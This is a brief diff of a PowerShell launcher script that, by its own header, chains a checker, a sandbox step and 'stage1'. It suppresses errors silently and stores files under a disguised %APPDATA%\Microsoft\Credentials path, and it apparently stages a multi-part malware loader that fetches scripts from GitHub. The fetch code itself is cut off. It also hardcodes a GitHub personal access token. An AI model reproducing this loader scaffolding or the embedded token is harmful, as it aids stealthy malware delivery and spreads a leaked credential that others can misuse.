@@ -1,8 +1,7 @@
 # launcher.ps1 - Chains checker â†’ sandbox â†’ stage1
 
 $ErrorActionPreference = 'SilentlyContinue'
-$appData = [System.IO.Path]::GetFolderPath('ApplicationData')
-$basePath = "$appData\Microsoft\Credentials"
+$basePath = "$env:APPDATA\Microsoft\Credentials"
 $githubToken = "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"
 
 # === Fetch scripts from GitHub via API ===
